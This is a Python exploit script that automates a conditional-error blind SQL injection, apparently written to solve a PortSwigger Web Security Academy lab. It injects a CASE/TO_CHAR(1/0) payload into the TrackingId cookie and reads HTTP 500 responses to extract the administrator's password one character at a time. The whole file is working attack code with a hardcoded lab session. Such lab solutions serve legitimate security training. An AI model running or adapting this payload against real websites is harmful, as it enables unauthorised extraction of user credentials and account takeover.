#!/usr/bin/python3
from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig,frame):
    print("\n\n Aborted! (CTRL + C)\n")
    sys.exit[1]
#crt+c 
signal.signal(signal.SIGINT,def_handler)

main_url = "https://0a62000204834646c0a409d800c50021.web-security-academy.net"
characters_dictionary = string.ascii_lowercase + string.digits #Lower case characters from a to z and numbers
password_length = 20

def MakeRequest():
    password = ""

    progress_log1 = log.progress("Brute Force")
    progress_log1.status("Begining brute force attack!")
    time.sleep(2)
    pw_log = log.progress("Password")
    password_length = 20

    for i in range(1,password_length + 1):
        for c in characters_dictionary:
            cookies = {
                    'TrackingId':"GnaRqKIuErNCSkWg'||(select(CASE WHEN (SUBSTR(password,%d,1)='%s') THEN TO_CHAR(1/0) ELSE NULL END) from users where username = 'administrator')||'" %(i, c),
                'session':'Ldsginu6Bgv4L5fTnASUmAYwJXvGzpnZ'
            }

            progress_log1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies = cookies)
            #print(r.text)
            #time.sleep(100)
            if r.status_code == 500:
                password += c
                pw_log.status(password)
                break
if __name__ == '__main__':
    MakeRequest()
                  
